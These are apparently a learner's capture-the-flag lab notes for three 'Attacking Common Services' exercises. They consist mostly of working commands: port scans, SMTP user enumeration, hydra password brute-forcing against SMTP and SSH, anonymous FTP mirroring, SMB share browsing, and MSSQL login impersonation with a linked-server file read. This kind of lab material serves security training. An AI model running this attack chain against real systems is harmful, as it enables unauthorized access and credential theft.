### Attacking Common Services - Easy

```
# Solution 
(something was broken on lab hosts: email servies, ports didn't work correctly)
(trying on several hosts, finally took notes and guides from web)

sudo nmap -sV 10.129.75.199 -Pn                # Check options for services and ports
sudo nmap -Pn -A 10.129.33.157
sudo nmap -sV -sC 10.129.75.199
sudo nmap -sV -sC 10.129.75.199
sudo nmap -sV -p21 -sC -A 10.129.75.199

echo "10.129.75.199 inlanefreight.htb" | sudo tee -a /etc/hosts              # add domain to hosts file

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7    # getting 1 user on smtp (worked in guides)
 
hydra -l fiona@inlanefreight.htb -P ./pws.list -t 64 -f 10.129.203.7 smtp                        # no results 
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.203.7 smtp  # got pass (worked in guides)

mysql -u fiona -p9876.. -h 10.129.203.7   # trying to login to mysql with creds, success

SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");  # Using mysql LOAD_FILE() Function (looking like lolbas, yeap)
```

### Attacking Common Services - Medium

```
# Solution

10.129.248.69

sudo nmap -A -sV 10.129.248.69
sudo nmap -sV -p- 10.129.248.69 -Pn                                    # check ports and svcs
wget -m --no-passive ftp://anonymous:anonymous@10.129.248.69:30021/    # Mirror the contents and dwnld with wget
cat 10.129.248.69:30021/simon/mynotes.txt                              # read file from ftp
hydra -l simon -P mynotes.txt -u 10.129.248.69 ssh                     # b-f user (folder name) and pass from a file
ssh simon@10.129.248.69                                                # ssh and ctf
```


### Attacking Common Services - Hard

```
# Solution 

10.129.203.10

sudo nmap -sV -p- 10.129.203.10 -Pn 
smbclient -N -L //10.129.203.10/
smbclient //10.129.203.10/Home
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls
# lookign to all users files, you can all answers 
get <path\to\file>      # to download file and open it on your PenTest host
xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'

    
# run sqlcmd - win+r and from there escalate privilagies, read the flag on Admin desktop

SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES;
go

EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
go


SELECT srvname, isremote FROM sysservers;
go
EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];
go
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
go

# flag will be in output
```
